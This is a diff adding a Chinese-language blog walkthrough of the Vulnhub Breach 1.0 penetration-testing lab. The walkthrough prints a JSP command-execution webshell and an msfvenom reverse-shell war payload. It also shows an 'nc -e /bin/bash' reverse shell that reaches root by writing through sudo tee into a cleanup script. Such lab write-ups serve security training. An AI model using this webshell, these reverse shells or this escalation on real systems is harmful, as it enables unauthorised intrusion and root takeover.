@@ -16423,4 +16423,94 @@ set LPORT 1234</code></pre>
 <p>![image-20220921004718401](Vulnhub Breach 1.0.assets/image-20220921004718401.png)</p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Vulnhub Breach 1.0</title>
+    <url>/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/</url>
+    <content><![CDATA[<h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><p><a href="https://download.vulnhub.com/breach/Breach-1.0.zip">https://download.vulnhub.com/breach/Breach-1.0.zip</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>vmware导入下载解压后的ova文件</p>
+<p>设置host-only模式，设置ip 192.168.110.0（breach静态地址192.168.110.140）</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921000956643.png" alt="image-20220921000956643"></p>
+<ul>
+<li>攻击机IP：192.168.110.128</li>
+<li>靶机IP：192.168.110.140</li>
+</ul>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>开启breach</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921001107489.png" alt="image-20220921001107489"></p>
+<p>访问192.168.110.140web服务</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921001314088.png" alt="image-20220921001314088"></p>
+<p>f12中发现base64字符串 解密后<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
+<p>后台登录发现第三封邮件存在一份ssl证书<code>192.168.110.140/.keystore</code></p>
+<pre><code>http://192.168.110.140/impresscms/readpmsg.php?start=0&amp;total_messages=3</code></pre>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920162607332.png" alt="image-20220920162607332"></p>
+<p>发现一个流量包</p>
+<pre><code>http://192.168.110.140/impresscms/modules/content/content.php?content_id=1</code></pre>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920162617863.png" alt="image-20220920162617863"></p>
+<ul>
+<li><code>_SSL_test_phase1.pcap</code>一个流量包，此流量包为黑客留下。</li>
+</ul>
+<p>jdk/bin目录下的keytool.exe可以用来查看和导入证书</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920171559066.png" alt="image-20220920171559066"></p>
+<p>导出该证书，重命名为：<code>keystore.p12</code>（<code>.p12</code>它是保存私钥和证书的组合格式，是最新的签名实用程序使用的格式）</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920171541856.png" alt="image-20220920171541856"></p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920171531050.png" alt="image-20220920171531050"></p>
+<p><code>wireshark-&gt;编辑-&gt;首选项-&gt;Protocols-&gt;TLS</code>添加此p12证书</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220920170128933.png" alt="image-20220920170128933"></p>
+<p>导入后发现之前加密后的部分TLS变成了HTTP</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921002500753.png" alt="image-20220921002500753"></p>
+<p>发现一个命令执行的包，两个疑似图片马，还有一个Unauthorized认证包</p>
+<pre><code>https://192.168.110.140:8443/_M@nag3Me/html</code></pre>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921002842058.png" alt="image-20220921002842058"></p>
+<p>basic加密的账号密码</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003003606.png" alt="image-20220921003003606"></p>
+<p>登录后台</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003042121.png" alt="image-20220921003042121"></p>
+<p>常规上传jsp马生成成war包，发现会被删除</p>
+<pre class=" language-jsp"><code class="language-jsp"><%
+    if("000".equals(request.getParameter("a"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("</pre>");
+    }
+%></code></pre>
+<p>只能采用msf生成的war进行反弹shell</p>
+<pre><code>msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=1234 -f war -o shell.war</code></pre>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003520314.png" alt="image-20220921003520314"></p>
+<p>设置参数</p>
+<pre><code>set LHOST 192.168.110.128
+set LPORT 1234</code></pre>
+<p>访问<a href="https://192.168.110.140:8443/shell/%EF%BC%8C%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell">https://192.168.110.140:8443/shell/，成功反弹shell</a></p>
+<p>将shell升级为 tty，得到一个交互式的shell：</p>
+<pre><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921003735683.png" alt="image-20220921003735683"></p>
+<p>在/etc/passwd中发现两个用户</p>
+<p>发现数据库连接文件</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004027920.png" alt="image-20220921004027920"></p>
+<p>发现milton解密后的密码thelaststraw</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004054916.png" alt="image-20220921004054916"></p>
+<p>登录后发现不属于sudo组</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004226756.png" alt="image-20220921004226756"></p>
+<p>历史命令发现blumbergh可能有root权限</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004305363.png" alt="image-20220921004305363"></p>
+<p>bill.png中找到了密码：<code>coffeestains</code></p>
+<p>能够以root权限执行这tee程序和tidyup.sh脚本：<code>/usr/bin/tee</code>和<code>/usr/share/cleanup/tidyup.sh</code>，其中tee命令用于读取标准输入的数据，并将其内容输出成文件，tidyup.sh是清理脚本</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004425743.png" alt="image-20220921004425743"></p>
+<ul>
+<li><p>向tidyup.sh中写入反弹shell命令，由于能够以root权限运行tee命令，即可以用tee命令写tidyup.sh</p>
+</li>
+<li><p>先将反弹shell命令写入shell.txt文件，使用bash反弹shell命令没有成功，于是使用nc命令反弹shell成功，所以写nc反弹命令：echo “nc -e /bin/bash 192.168.110.128 4321” &gt; shell.txt</p>
+</li>
+<li><p>再使用tee命令将shell.txt内容输出到tidyup.sh：cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</p>
+</li>
+</ul>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004548670.png" alt="image-20220921004548670"></p>
+<p>起一个监听成功反弹shell<img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004640558.png" alt="image-20220921004640558"></p>
+<p>root权限，提权结束</p>
+<p><img src="/2022/09/21/vulnhub/vulnhub-breach-1-0/vulnhub-breach-1-0/image-20220921004718401.png" alt="image-20220921004718401"></p>
+]]></content>
+  </entry>
 </search>
